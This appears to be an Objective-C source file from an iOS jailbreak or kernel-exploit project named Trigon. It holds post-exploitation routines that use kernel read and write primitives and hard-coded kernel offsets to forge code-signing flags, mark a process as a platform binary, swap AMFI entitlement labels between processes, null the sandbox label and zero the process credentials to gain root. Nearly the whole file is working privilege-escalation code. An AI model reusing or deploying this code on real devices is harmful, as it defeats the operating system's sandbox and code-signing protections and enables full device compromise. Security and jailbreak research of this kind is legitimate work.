//
//  fun.m
//  Trigon
//
//  Created by Benjamin on 6/18/25.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach-o/loader.h>
#import "info.h"
#import "surface.h"
#import "translation.h"

#define TF_PLATFORM (0x00000400)
#define CS_PLATFORM_BINARY (0x04000000)
#define CS_INSTALLER (0x00000008)
#define CS_GET_TASK_ALLOW (0x00000004)
#define CS_RESTRICT (0x00000800)
#define CS_HARD (0x00000100)
#define CS_KILL (0x00000200)
#define CS_DEBUGGED                    0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */

uint64_t off_p_task = 0x10;
uint64_t off_task_t_flags = 0x3d8;
uint64_t off_p_csflags = 0x280;
uint64_t off_p_textvp = 0x220;
uint64_t off_vnode_vu_ubcinfo = 0x78;
uint64_t off_ubc_info_cs_blobs = 0x50;
uint64_t off_cs_blob_csb_platform_binary = 0xa0;

uint64_t findProc(pid_t pid);
int csops(pid_t pid, unsigned int ops, uint32_t *useraddr, size_t usersize);

bool set_task_platform(pid_t pid, bool set) {
    printf("set_task_platform\n");
    uint64_t proc = findProc(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);
    
    if (set) {
        t_flags |= TF_PLATFORM;
    } else {
        t_flags &= ~(TF_PLATFORM);
    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}

void set_proc_csflags(pid_t pid) {
    printf("set_proc_csflags\n");
    uint64_t proc = findProc(pid);
    uint32_t csflags = kread32(proc + off_p_csflags);
    csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kwrite32(proc + off_p_csflags, csflags);
}

uint64_t get_cs_blob(pid_t pid) {
    printf("get_cs_blob\n");
    uint64_t proc = findProc(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
    printf("set_csb_platform_binary\n");
    uint64_t cs_blob = get_cs_blob(pid);
    kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

void platformize(pid_t pid) {
    printf("platformize\n");
    set_task_platform(pid, true);
    set_proc_csflags(pid);
    set_csb_platform_binary(pid);
}

void print_csflags(pid_t pid) {
    uint32_t csflags = 0;
    if (csops(pid, 0, &csflags, sizeof(csflags)) != 0) {
        perror("csops");
        return;
    }
    printf("CS Flags for pid %d: 0x%08X\n", pid, csflags);
    if (csflags & CS_PLATFORM_BINARY)    printf(" - CS_PLATFORM_BINARY\n");
    if (csflags & CS_KILL)               printf(" - CS_KILL\n");
    if (csflags & CS_HARD)               printf(" - CS_HARD\n");
    if (csflags & CS_RESTRICT)           printf(" - CS_RESTRICT\n");
    if (csflags & CS_DEBUGGED)           printf(" - CS_DEBUGGED\n");
}

uint64_t borrow_entitlements(pid_t to_pid, pid_t from_pid) {
    uint64_t to_proc = findProc(to_pid);
    uint64_t from_proc = findProc(from_pid);
    uint64_t to_ucred = kread64(to_proc + 0xf0);
    uint64_t from_ucred = kread64(from_proc + 0xf0);
    uint64_t to_cr_label = kread64(to_ucred + 0x78);
    uint64_t from_cr_label = kread64(from_ucred + 0x78);
    uint64_t to_amfi = kread64(to_cr_label + 0x08);
    uint64_t from_amfi = kread64(from_cr_label + 0x08);
    kwrite64(to_cr_label + 0x08, from_amfi);
    return to_amfi;
}

void print_ents(void) {
    uint32_t hdr[2];
    csops(getpid(), 7, hdr, sizeof(hdr));
    uint32_t len = OSSwapHostToBigInt32(hdr[1]);
    void* buf = malloc(len);
    csops(getpid(), 7, buf, len);
    printf("ents: %s\n", (char*)(buf + 8));
    free(buf);
}

void fun(void) {
    uint64_t ourUcred = kread64(gDeviceInfo.ourProc + 0xF0);
    uint64_t ourLabel = kread64(ourUcred + 0x78);
    kwrite64(ourLabel + 0x10, 0);
    kwrite32(ourUcred + 0x20, 0);
    // Need to setuid(0) twice to properly set
    setuid(0);
    setuid(0);
    setgid(0);
    printf("UID: %u\n", getuid());
    
    print_csflags(getpid());
    print_ents();

}
